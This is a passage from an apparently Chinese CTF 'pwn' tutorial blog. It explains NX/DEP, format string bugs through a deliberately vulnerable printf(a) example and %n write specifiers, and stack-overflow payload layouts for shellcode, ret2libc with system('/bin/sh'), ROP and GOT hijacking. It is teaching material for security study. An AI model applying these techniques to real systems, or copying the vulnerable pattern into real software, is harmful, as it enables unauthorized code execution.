Prevention)</h3><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><p><strong>检测方法</strong></p><p>在安装过pwntools终端输入checksec+文件名</p><h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><p><strong>原因：</strong><br>正确使用printf是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  int n&#x3D;5;</span><br><span class="line">  printf(&quot;%d&quot;,n);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也有人这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[]&#x3D;&quot;neuqcsa&quot;;</span><br><span class="line">  printf(a);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码不会有什么问题，但是如果将字符串的输入权交给用户就会有问题了。看下面的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[100];</span><br><span class="line">  scanf(&quot;%s&quot;,a);</span><br><span class="line">  printf(a);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果用户输入的字符串是”%x%x%x”，则会输出以下结果：</p><p><img src="/2019/07/22/pwn-base/20181208232026599.png"></p><p>图片上显示的是内存的数据，以上就是产生漏洞的原因了</p><p>一些参数:</p><pre><code>%c：输出字符，配上%n可用于向指定地址写数据。%d：输出十进制整数，配上%n可用于向指定地址写数据。%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制据，    %i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，    在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，    如%i$s表示输出偏移i处地址所指向的字符串，    在32bit和64bit环境下一样，可用于读取GOT表等信息。%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，    如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），    而%$hn表示写入的地址空间为2字节，    %$hhn表示写入的地址空间为1字节，    %$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。    有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。    %n是通过格式化字符串漏洞改变程序流程的关键方式，    而其他格式化字符串参数可用于读取信息或配合%n写数据。</code></pre><p><strong>漏洞利用</strong></p><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><p><strong>原理：</strong>让 eip 载入攻击指令的地址</p><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p><strong>前提：</strong>在函数调用栈上的数据（shellcode）要有可执行的权限，并且关闭内存布局随机化</p><p><strong>原理：</strong>修改返回地址，让其指向溢出数据中的一段指令</p><pre><code>payload : padding1 + address of shellcode + padding2 + shellcode</code></pre><p><strong>具体细节：</strong></p><p>**padding1:**代表函数参数，逆序进入栈中，可以随意填充,长度应该刚好覆盖函数的基地址</p><p><strong>获取长度方法：</strong>1.查看汇编代码 2.运行程序时用不断增加输入长度的方法来试探</p><p>**address of shellcode:**shellcode 起始处的地址，用来覆盖返回地址</p><p><strong>padding2：</strong>可以随意填充，长度可以任意</p><p>**shellcode:**应为十六进制的机器码格式</p><p><img src="/2019/07/22/pwn-base/1.png"></p><h3 id="Return2libc"><a href="#Return2libc" class="headerlink" title="Return2libc"></a>Return2libc</h3><p><strong>前提：</strong>操作系统关闭内存布局随机化（ASLR），而且 shellcode 还需要程序调用栈有可执行权限</p><p>**原理:**修改返回地址，让其指向内存中已有的某个函数</p><pre><code>payload: padding1 + address of system() + padding2 + address of “/bin/sh”</code></pre><p><strong>具体细节：</strong></p><p><strong>address of system()：</strong>是 system() 在内存中的地址，用来覆盖返回地址</p><p>程序是如何调用动态链接库中的函数的过程：</p><p>当函数被动态链接至程序中，程序在运行时首先确定动态链接库在内存的起始地址，再加上函数在动态库中的相对偏移量，最终得到函数在内存的绝对地址</p><p><strong>padding2：</strong>该处的数据长度为4（32位机），对应调用 system() 时的返回地址</p><p><strong>address of “/bin/sh”：</strong>是字符串 “/bin/sh” 在内存中的地址，作为传给 system() 的参数。</p><p><img src="/2019/07/22/pwn-base/v2-4523795fdf150416d91e4e4adc0ef0ae_hd.png"></p><h3 id="ROP-Return-Oriented-Programming"><a href="#ROP-Return-Oriented-Programming" class="headerlink" title="ROP ( Return Oriented Programming )"></a>ROP ( Return Oriented Programming )</h3><p><strong>前提：</strong></p><p><strong>原理：</strong>修改返回地址，让其指向内存中已有的一段指令</p><pre><code>payload1 : padding + address of gadgetpayload2 : padding + address of gadget 1 + address of gadget 2 + ...... + address of gadget n</code></pre><p><strong>具体细节：</strong></p><h3 id="Hijack-GOT"><a href="#Hijack-GOT" class="headerlink" title="Hijack GOT"></a>Hijack GOT</h3><p><strong>前提：</strong></p><p><strong>原理：</strong>修改某个被调用函数的地址，让其指向另一个函数</p><p><img src="/2019/07/22/pwn-base/v2-e53f1d43a7191e3ea6922bea253bccbe_hd.png"></p><p><strong>具体细节：</strong></p><h2 id="一些工具的使用"><a href="#一些工具的使用" class="headerlink" title="一些工具的使用"></a>一些工具的使用</h2><h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><h3 id="Cyclic的使用"><a href="#Cyclic的使用" class="headerlink" title="Cyclic的使用"></a>Cyclic的使用</h3><p><strong>简介：</strong>Cyclic pattern是一个很强大的功能，大概意思就是，使用pwntools生成一个pattern，pattern就是指一个字符串，可以通过其中的一部分数据去定位到他在一个字符串中的位置。</p><p><strong>命令：</strong></p><pre><code>cyclic 100   用来生成一个特殊的字符串，随意取都不重复cyclic -l 字符串    查找字符串位置</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
            <tag> 二进制 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
